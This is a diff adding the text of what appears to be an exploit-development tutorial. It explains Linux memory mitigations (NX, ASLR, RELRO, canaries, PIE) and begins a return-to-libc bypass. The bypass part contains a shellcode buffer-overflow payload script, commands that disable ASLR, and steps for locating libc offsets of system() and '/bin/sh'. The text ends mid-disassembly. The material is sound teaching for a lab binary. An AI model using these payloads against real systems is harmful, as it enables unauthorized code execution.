@@ -114,13 +114,470 @@
             
             
                 <dt>reading time</dt>
-                <dd>0 minutes</dd>
+                <dd>15 minutes</dd>
             
         </dl>
     </section>
     
     <div>
-        
+        <p>To make exploitation more challenging, several mitigations have been developed and widely implemented. Let’s dive into some of the most popular ones and understand how they work:</p>
+<p><strong>1. DEP/NX (Data Execution Prevention / No eXecute):</strong></p>
+<p>Data Execution Prevention (DEP), also called No eXecute (NX), is a security feature that prevents code from running in non-executable memory regions like the stack or heap, blocking buffer overflow attacks that inject shellcode into these areas. The No-Execute (NX) bit, also known as Execute Disable (XD) in Intel terminology, is a hardware mechanism marking memory regions as non-executable, so code stored there cannot run. The NX bit was first introduced by AMD and later adopted by Intel as XD. It became widely implemented in operating systems starting with Windows XP SP2 and various Linux distributions. Most modern processors support this feature, allowing operating systems to enforce memory protections effectively.</p>
+<p>How it Works:
+DEP/NX marks memory pages as either writable or executable, but never both. This means that even if an attacker injects malicious code into a writable region, it can’t be executed.</p>
+<p>Example:
+Trying to execute shellcode from the stack with NX enabled will cause the program to crash, preventing exploitation.</p>
+<p><strong>2. ASLR (Address Space Layout Randomization):</strong></p>
+<p>Address Space Layout Randomization (ASLR) introduces randomness by shuffling the memory addresses of important regions, such as the stack, heap, and libraries, each time the program runs. This unpredictability makes it far harder for attackers to predict where their payload or code will end up.</p>
+<p>How it Works:
+ASLR assigns a different memory address to regions of a process each time it’s loaded. This means an attacker can&rsquo;t rely on specific memory addresses staying the same across runs.</p>
+<p>Example:
+If an attacker tries to jump to a specific libc function by guessing its address, ASLR will frustrate these efforts by randomizing the location on each execution.</p>
+<p>ASLR Configuration in Linux:</p>
+<p>You can check and configure ASLR settings in Linux by interacting with the <code>/proc/sys/kernel/randomize_va_space</code> file. This file controls the level of randomization applied:</p>
+<ul>
+<li><code>0</code>: No randomization (static memory layout).</li>
+<li><code>1</code>: Conservative randomization (randomizes shared libraries, stack, heap, and mmap).</li>
+<li><code>2</code>: Full randomization (includes brk() management).</li>
+</ul>
+<p>To enable full randomization, use:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#ae81ff">2</span> | sudo tee /proc/sys/kernel/randomize_va_space
+</span></span></code></pre></div><p>The following C program demonstrates ASLR’s effect by displaying addresses for a function, a local variable, and a dynamically allocated heap variable each time the program runs.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// gcc -m32 aslr.c -o aslr
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// gcc -m32 aslr.c -o aslr
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_addresses</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>heap_variable <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>)); <span style="color:#75715e">// Allocate memory on the heap
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">print_addresses</span>(); <span style="color:#75715e">// Print function and variable addresses
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Address of heap variable: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)heap_variable); <span style="color:#75715e">// Print heap address
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">free</span>(heap_variable); <span style="color:#75715e">// Free memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_addresses</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> local_variable;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Address of main: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)main);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Address of local variable: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_variable);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Run the program multiple times with ASLR enabled (set to <code>2</code>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./aslr 
+</span></span><span style="display:flex;"><span>Address of main: 0x566451ad
+</span></span><span style="display:flex;"><span>Address of local variable: 0xffd29fac
+</span></span><span style="display:flex;"><span>Address of heap variable: 0x581761a0
+</span></span><span style="display:flex;"><span>$ ./aslr 
+</span></span><span style="display:flex;"><span>Address of main: 0x566221ad
+</span></span><span style="display:flex;"><span>Address of local variable: 0xffbcf99c
+</span></span><span style="display:flex;"><span>Address of heap variable: 0x5701b1a0
+</span></span><span style="display:flex;"><span>$ ./aslr 
+</span></span><span style="display:flex;"><span>Address of main: 0x566441ad
+</span></span><span style="display:flex;"><span>Address of local variable: 0xffb70fbc
+</span></span><span style="display:flex;"><span>Address of heap variable: 0x570f91a0
+</span></span></code></pre></div><p>Notice how the addresses vary each time, making memory layout unpredictable.</p>
+<p>Disabling ASLR:
+By setting <code>/proc/sys/kernel/randomize_va_space</code> to <code>0</code>, ASLR is disabled, and addresses remain static across runs:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#ae81ff">0</span> | sudo tee /proc/sys/kernel/randomize_va_space
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./aslr 
+</span></span><span style="display:flex;"><span>Address of main: 0x565561ad
+</span></span><span style="display:flex;"><span>Address of local variable: 0xffffd64c
+</span></span><span style="display:flex;"><span>Address of heap variable: 0x5655a1a0
+</span></span><span style="display:flex;"><span>$ ./aslr 
+</span></span><span style="display:flex;"><span>Address of main: 0x565561ad
+</span></span><span style="display:flex;"><span>Address of local variable: 0xffffd64c
+</span></span><span style="display:flex;"><span>Address of heap variable: 0x5655a1a0
+</span></span><span style="display:flex;"><span>$ ./aslr 
+</span></span><span style="display:flex;"><span>Address of main: 0x565561ad
+</span></span><span style="display:flex;"><span>Address of local variable: 0xffffd64c
+</span></span><span style="display:flex;"><span>Address of heap variable: 0x5655a1a0
+</span></span></code></pre></div><p>With ASLR disabled, addresses stay constant on each run, removing the randomization layer, making it easier for attackers to predict addresses and exploit memory vulnerabilities.</p>
+<p>It&rsquo;s important to note that even with ASLR enabled, the offset for functions and gadgets within libc remains the same. This means that once we know the libc base address, we can determine the address of any libc function or gadget at runtime simply by adding the known offset to the base.</p>
+<p><strong>3. RELRO (Relocation Read-Only):</strong></p>
+<p>Relocation Read-Only (RELRO) is a security feature implemented in the GNU Linker to enhance the security of ELF (Executable and Linkable Format) binaries by protecting certain sections from being overwritten. This feature is particularly focused on safeguarding the Global Offset Table (GOT), which is crucial for dynamic linking and can be exploited in various attacks. RELRO stands for Relocation Read-Only. It primarily aims to prevent attackers from modifying the GOT, which holds addresses for dynamically linked functions. By making these sections read-only after relocation, RELRO mitigates risks associated with binary exploitation techniques, such as GOT overwrite attacks.</p>
+<p>Types of RELRO
+There are two modes of RELRO:</p>
+<ul>
+<li>Partial RELRO:
+<ul>
+<li>This mode marks the non-Procedure Linkage Table (non-PLT) part of the GOT as read-only after relocation.</li>
+<li>The PLT remains writable, meaning that while it provides some protection, it does not fully safeguard against all types of attacks.</li>
+<li>Partial RELRO is often the default setting in many GCC-compiled binaries.</li>
+</ul>
+</li>
+<li>Full RELRO:
+<ul>
+<li>In this mode, both the GOT and PLT are made read-only after relocation.</li>
+<li>This provides a higher level of security by preventing any modifications to these sections during runtime.</li>
+<li>Full RELRO can increase startup time since all dynamic symbols must be resolved before execution begins.</li>
+</ul>
+</li>
+</ul>
+<p>Implementation of RELRO:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#75715e"># For Partial RELRO:</span>
+</span></span><span style="display:flex;"><span>$ gcc -o file file.c -Wl,-z,relro
+</span></span><span style="display:flex;"><span>$ <span style="color:#75715e"># For Full RELRO:</span>
+</span></span><span style="display:flex;"><span>$ gcc -o file file.c -Wl,-z,relro,-z,now
+</span></span></code></pre></div><p>Full RELRO provides stronger protection against GOT overwrite attacks compared to Partial RELRO. However, it can lead to
+longer startup times since all symbols must be resolved before execution.</p>
+<p>We’ll dive deeper into this concept when we explore bypass techniques.</p>
+<p><strong>4. Stack Canaries</strong></p>
+<p>Stack canaries, also known as security cookies, are a protective mechanism used to defend against buffer overflow attacks. Stack canaries act as a safeguard against buffer overflow attacks by introducing a random value, referred to as a &ldquo;canary,&rdquo; onto the stack near the return address. This canary serves as a sentinel that monitors any unauthorized modifications to the stack area.</p>
+<p>How it Works:
+During a function call, a random canary value is inserted between the buffer and the return address on the stack. Before returning from a function, the program checks the integrity of this canary value. If it finds that the canary has been altered, it suggests a potential buffer overflow attack, prompting the program to take defensive actions such as terminating execution or invoking additional security measures.</p>
+<p>Types of Stack Canaries:</p>
+<ol>
+<li>
+<p>Terminator Canaries
+These contain common string terminators like <code>\x00</code>, <code>\r</code>, <code>\n</code>, and <code>\xFF</code>. They help prevent attacks involving string operations by stopping prematurely due to these terminators.</p>
+</li>
+<li>
+<p>Random Canaries
+Generated randomly at runtime, typically drawn from /dev/urandom if available. This randomness makes it challenging for attackers to predict or manipulate the canary value.</p>
+</li>
+<li>
+<p>Random XOR Canaries
+Combine random numbers with control data (like the frame pointer and return address) using XOR operations. This ensures even slight modifications to the canary will result in incorrect values, triggering immediate termination.</p>
+</li>
+</ol>
+<p><strong>5. PIE (Position Independent Executables)</strong></p>
+<p>Position Independent Executables (PIE) randomize the location of the executable itself, adding another layer of unpredictability to binary loading. Unlike ASLR, which affects shared libraries, PIE applies to the binary’s main code, making it more challenging to predict code locations for return-oriented programming (ROP) attacks.</p>
+<p>How it Works:
+PIE enables the entire binary to be relocated to different memory addresses each time it runs. This feature requires the binary to be compiled in a way that allows it to operate independently of a fixed memory location.</p>
+<p>Example:
+If an attacker tries to jump to a specific function within the executable, PIE will have randomized its position, forcing them to dynamically resolve the new address.</p>
+<p>To check which mitigations are enabled on a <code>binary</code>, you can use checksec from the <code>pwntools</code> suite:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ pwn checksec exp2_nx
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/kali/Desktop/Blogs/Materials/x86_exp_dev/02/exp2_nx&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:       i386-32-little
+</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:      No canary found
+</span></span><span style="display:flex;"><span>    NX:         NX enabled
+</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x8048000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Stripped:   No
+</span></span></code></pre></div><p>From the output, we can observe:</p>
+<ul>
+<li>NX: The stack is non-executable (NX enabled), blocking code execution in writable areas.</li>
+<li>RELRO: Partial RELRO is enabled, providing limited protection for GOT entries.</li>
+<li>Stack Canary: Not found, so the binary lacks buffer overflow protection for stack frames.</li>
+<li>PIE: Position Independent Executable is disabled, meaning the executable loads at a fixed address.</li>
+</ul>
+<hr>
+<h2 id="1-depnx-data-execution-prevention--no-execute">1. DEP/NX (Data Execution Prevention / No eXecute):</h2>
+<p>Now, let’s work on bypassing NX! We’ll attempt to execute the same shellcode from our <code>jmp eax</code> example.</p>
+<p>📝 Note: Make sure ASLR is disabled before proceeding.</p>
+<p>Compile the Binary with NX Enabled</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc -m32 exp1.c -fno-stack-protector -no-pie -o exp2_nx
+</span></span></code></pre></div><p>For this test, I&rsquo;ve renamed <code>exp1.py</code> to <code>exp2.py</code> and updated it to point to our jmp eax gadget.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># exp2.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">62</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf7d5f000</span>
+</span></span><span style="display:flex;"><span>jmp_eax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00024fe3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span> <span style="color:#75715e"># 10 NOPS</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># /bin/sh shellcode</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(offset<span style="color:#f92672">-</span>len(payload)) <span style="color:#75715e"># padding</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#payload += &#34;BBBB&#34; # EIP</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>,libc_base<span style="color:#f92672">+</span>jmp_eax) <span style="color:#75715e"># EIP</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span></code></pre></div><p>Now, let&rsquo;s try to execute the exploit with NX enabled on <code>exp2_nx</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./exp2_nx  <span style="color:#66d9ef">$(</span>./exp2.py<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Let&rsquo;s examine the core dump to see what happened:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb -core core 
+</span></span><span style="display:flex;"><span>Program terminated with signal SIGSEGV, Segmentation fault.
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#0  0xffffd5ce in ?? ()</span>
+</span></span><span style="display:flex;"><span>──────────────────<span style="color:#f92672">[</span> REGISTERS / show-flags off / show-compact-regs off <span style="color:#f92672">]</span>──────────────────
+</span></span><span style="display:flex;"><span> EAX  0xffffd5ce ◂— 0x90909090
+</span></span><span style="display:flex;"><span> EBX  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> ECX  0xffffd910 ◂— 0xf7d83f
+</span></span><span style="display:flex;"><span> EDX  0xffffd60d ◂— 0xf7d83f
+</span></span><span style="display:flex;"><span> EDI  0xf7ffcb60 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> ESI  0xffffd700 —▸ 0xffffd914 ◂— <span style="color:#e6db74">&#39;SHELL=/usr/bin/bash&#39;</span>
+</span></span><span style="display:flex;"><span> EBP  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> ESP  0xffffd610 —▸ 0xffffd800 ◂— <span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span> EIP  0xffffd5ce ◂— 0x90909090
+</span></span><span style="display:flex;"><span>────────────────────────────<span style="color:#f92672">[</span> DISASM / i386 / set emulate on <span style="color:#f92672">]</span>────────────────────────────
+</span></span><span style="display:flex;"><span> ► 0xffffd5ce    nop    
+</span></span><span style="display:flex;"><span>   0xffffd5cf    nop    
+</span></span><span style="display:flex;"><span>   0xffffd5d0    nop    
+</span></span><span style="display:flex;"><span>   0xffffd5d1    nop    
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>🔍 Here, we can see that we successfully landed on the NOP sled, but because the shellcode is in a non-executable memory region (due to NX), it cannot be executed. 😞</p>
+<p>This example demonstrates the effectiveness of NX by preventing code execution in non-executable memory regions. 🛡️</p>
+<p>So, how can we bypass NX? 🤔 While we can&rsquo;t execute injected shellcode directly due to the non-executable stack, we can still execute existing code within the binary or libraries. This approach is called Return-Oriented Programming (ROP).</p>
+<p>With ROP, we construct a payload that leverages small &ldquo;gadgets&rdquo;—existing sequences of instructions ending in a ret—to piece together our own custom execution flow. Essentially, instead of injecting new code, we’re &ldquo;reusing&rdquo; code that’s already in memory to achieve our exploit goals.</p>
+<p>In this example, let&rsquo;s use a technique called Return-to-libc (ret2libc) to bypass NX.</p>
+<p>Ret2libc is a simpler and more specific form of ROP where the attacker uses the existing functions in the C standard library (like system(), exit(), etc.) to perform actions, particularly when trying to execute a shell. When the stack is non-executable, shellcode injection won’t work. But instead of injecting our own code, we can reuse code that’s already loaded in memory—in this case, from the C library (libc), which includes functions like <code>system()</code> and string pointers like <code>/bin/sh</code>.</p>
+<p>Here&rsquo;s how ret2libc works:</p>
+<ol>
+<li>Find libc functions: We locate the <code>system()</code> function and a pointer to <code>/bin/sh</code> within libc. By calling <code>system(&quot;/bin/sh&quot;)</code>, we can spawn a shell.</li>
+<li>Modify the payload: Instead of shellcode, our payload will set up the stack to call <code>system(&quot;/bin/sh&quot;)</code>, effectively giving us shell access by reusing safe code already loaded.</li>
+</ol>
+<p>Let&rsquo;s implement this with our example exploit!</p>
+<p>Find <code>system()</code> offset within <code>libc</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nm -D /usr/lib32/libc.so.6 | grep -i system
+</span></span><span style="display:flex;"><span>000524c0 T __libc_system@@GLIBC_PRIVATE
+</span></span><span style="display:flex;"><span>00171b20 T svcerr_systemerr@GLIBC_2.0
+</span></span><span style="display:flex;"><span>000524c0 W system@@GLIBC_2.0
+</span></span></code></pre></div><p>For more info on <code>nm</code> refer my <a href="https://kernw0lf.github.io/posts/linux_exp_dev/01/">blog</a>.</p>
+<p>The offset for the <code>system</code> function in libc is <code>0x524c0</code>. We can verify this using GDB with the pwndbg extension.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb ./exp2_nx
+</span></span><span style="display:flex;"><span>pwndbg&gt; b main
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x804919f
+</span></span><span style="display:flex;"><span>pwndbg&gt; run
+</span></span><span style="display:flex;"><span>pwndbg&gt; xinfo system
+</span></span><span style="display:flex;"><span>Extended information <span style="color:#66d9ef">for</span> virtual address 0xf7db14c0:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Containing mapping:
+</span></span><span style="display:flex;"><span>0xf7d82000 0xf7f0e000 r-xp   18c000  <span style="color:#ae81ff">23000</span> /usr/lib32/libc.so.6
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Offset information:
+</span></span><span style="display:flex;"><span>         Mapped Area 0xf7db14c0 <span style="color:#f92672">=</span> 0xf7d82000 + 0x2f4c0
+</span></span><span style="display:flex;"><span>         File <span style="color:#f92672">(</span>Base<span style="color:#f92672">)</span> 0xf7db14c0 <span style="color:#f92672">=</span> 0xf7d5f000 + 0x524c0
+</span></span><span style="display:flex;"><span>      File <span style="color:#f92672">(</span>Segment<span style="color:#f92672">)</span> 0xf7db14c0 <span style="color:#f92672">=</span> 0xf7d82000 + 0x2f4c0
+</span></span><span style="display:flex;"><span>         File <span style="color:#f92672">(</span>Disk<span style="color:#f92672">)</span> 0xf7db14c0 <span style="color:#f92672">=</span> /usr/lib32/libc.so.6 + 0x524c0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Containing ELF sections:
+</span></span><span style="display:flex;"><span>               .text 0xf7db14c0 <span style="color:#f92672">=</span> 0xf7d821c0 + 0x2f300
+</span></span></code></pre></div><p><code>xinfo</code> command will provide extended information about the system function, showing details about its memory mapping.</p>
+<p>From this output, we can see that the libc base address is 0xf7d5f000 and the offset for system is confirmed as 0x524c0. This information is crucial for constructing our exploit.</p>
+<p>Now, next step is finding the offset of string <code>&quot;/bin/sh&quot;</code>.</p>
+<p>We can use <code>strings</code> utility for it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ strings -a -t x /usr/lib32/libc.so.6 | grep <span style="color:#e6db74">&#34;/bin/sh&#34;</span>
+</span></span><span style="display:flex;"><span> 1c9e3c /bin/sh
+</span></span></code></pre></div><p>So the offset for string &ldquo;/bin/sh&rdquo; in libc is 0x1c9e3c.</p>
+<p>We can also use GDB (pwndbg) for it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; search <span style="color:#e6db74">&#34;/bin/sh&#34;</span>
+</span></span><span style="display:flex;"><span>Searching <span style="color:#66d9ef">for</span> byte: b<span style="color:#e6db74">&#39;/bin/sh&#39;</span>
+</span></span><span style="display:flex;"><span>libc.so.6       0xf7f28e3c <span style="color:#e6db74">&#39;/bin/sh&#39;</span>
+</span></span></code></pre></div><p>So the offset will be <code>0xf7f28e3c-0xf7d5f000</code>=<code>0x1c9e3c</code></p>
+<p>To understand how function calls are made in x86 architecture and how to exploit them using the return-to-libc (ret2libc) technique, we need to break down a few concepts, particularly the call instruction and the function&rsquo;s stack frame.</p>
+<p><strong>Function Call Mechanism</strong></p>
+<ol>
+<li>
+<p>Call Instruction:
+When a function is called using the call instruction, the CPU performs the following steps:</p>
+<ul>
+<li>Pushes the return address (the address of the instruction following the call) onto the stack.</li>
+<li>Transfers control to the function by jumping to its address.</li>
+</ul>
+</li>
+<li>
+<p>Transfers Control:
+The CPU jumps to the function’s address, effectively transferring control to that function.</p>
+</li>
+<li>
+<p>Handles Function Arguments:</p>
+</li>
+</ol>
+<ul>
+<li>Arguments passed to the function are typically placed on the stack or in specific registers (depending on the calling convention).</li>
+<li>For example, in the <code>cdecl</code> calling convention, arguments are pushed onto the stack in <code>right-to-left</code> order before the <code>call</code> instruction is executed.</li>
+</ul>
+<p>For example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-s" data-lang="s"><span style="display:flex;"><span>call my_function
+</span></span></code></pre></div><p>If <code>my_function</code> is located at address <code>0x08048400</code>, the CPU will push the return address (say, <code>0x0804840A</code>) onto the stack and jump to <code>0x08048400</code>.</p>
+<p><em>Argument Handling</em>
+For instance, if <code>my_function</code> expects two integer arguments, you might see something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-s" data-lang="s"><span style="display:flex;"><span>push <span style="color:#ae81ff">2</span>      ; Push the second argument onto the stack
+</span></span><span style="display:flex;"><span>push <span style="color:#ae81ff">1</span>      ; Push the first argument onto the stack
+</span></span><span style="display:flex;"><span>call my_function
+</span></span></code></pre></div><p><em>Practical Example: C Program 🖥️</em>
+I&rsquo;ve used the following C program to explain it more practically:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">two_str</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s2) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,s1);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,s2);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>str1<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hello&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>str2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;world&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">two_str</span>(str1,str2);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>To see how function calls work, disassemble <code>main</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; disass main
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
+</span></span><span style="display:flex;"><span>   0x0804919a &lt;+0&gt;:	lea    ecx,<span style="color:#f92672">[</span>esp+0x4<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x0804919e &lt;+4&gt;:	and    esp,0xfffffff0
+</span></span><span style="display:flex;"><span>   0x080491a1 &lt;+7&gt;:	push   DWORD PTR <span style="color:#f92672">[</span>ecx-0x4<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x080491a4 &lt;+10&gt;:	push   ebp
+</span></span><span style="display:flex;"><span>   0x080491a5 &lt;+11&gt;:	mov    ebp,esp
+</span></span><span style="display:flex;"><span>   0x080491a7 &lt;+13&gt;:	push   ecx
+</span></span><span style="display:flex;"><span>   0x080491a8 &lt;+14&gt;:	sub    esp,0x14
+</span></span><span style="display:flex;"><span>   0x080491ab &lt;+17&gt;:	call   0x80491e5 &lt;__x86.get_pc_thunk.ax&gt;
